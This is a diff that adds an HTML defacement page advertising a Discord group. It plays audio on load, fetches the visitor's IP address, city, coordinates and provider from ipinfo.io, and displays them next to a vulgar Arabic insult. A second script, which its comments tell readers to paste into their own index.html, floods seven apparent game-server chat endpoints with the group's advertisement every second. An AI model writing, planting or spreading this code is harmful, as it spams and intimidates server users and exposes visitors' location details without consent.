@@ -1,0 +1,98 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://discord.gg/t101</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://cdn.discordapp.com/attachments/1401231921433804914/1403456306827890698/39605152-7902-444A-882E-DE7A9C0FF154.png?ex=68979e0a&is=68964c8a&hm=b6acb4acc5588c7982349bd0fcb4fc3846a11c8793851abed2619ceeda73efe6&') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #FFFFFF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 500px; 
+            height: auto;
+            border: 2px solid #FFFFFF; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.8); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #FFFFFF; 
+            text-shadow: 0px 0px 8px #FFFFFF, 0px 0px 15px #FFFFFF, 0px 0px 25px #FFFFFF; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #FF0000; 
+            text-shadow: 0px 0px 8px #FFFFFF, 0px 0px 15px #FFFFFF, 0px 0px 25px #FFFFFF; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1401231921433804914/1401645488196812983/06923de59c3a6117.mp4?ex=6896f655&is=6895a4d5&hm=efdb29eecc89dd02d834283847c85bbc00a41a0033bf28aeb5946a02977d1dff&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+   <div class="info" id="ip-info">
+        <strong>IP: <span id="ip"></span></strong><br>
+        <span><strong>City:</strong> <span id="city"></span></span><br>
+        <span><strong>Region:</strong> <span id="region"></span></span><br>
+        <span><strong>Country:</strong> <span id="country"></span></span><br>
+        <span><strong>Location:</strong> <span id="loc"></span></span><br>
+        <span><strong>Organization:</strong> <span id="org"></span></span><br>
+        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+    </div>
+    <div class="text"> كس اخت دمار عاخت انس
+
+
+</div>
+
+    <script>
+         fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
+        });
+    </script>
+
+<script>
+    // put the js code in YOUR index.html
+// حط الكود ب الاندكس حقك index.html
+// vjmi pulled all of them 👀
+// discord.gg/UAEE #1
+const msg = `discord.gg/t101  TEAM 101 ON TOP`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+
+}, 1000);
+    </script>
+</body>
+</html>
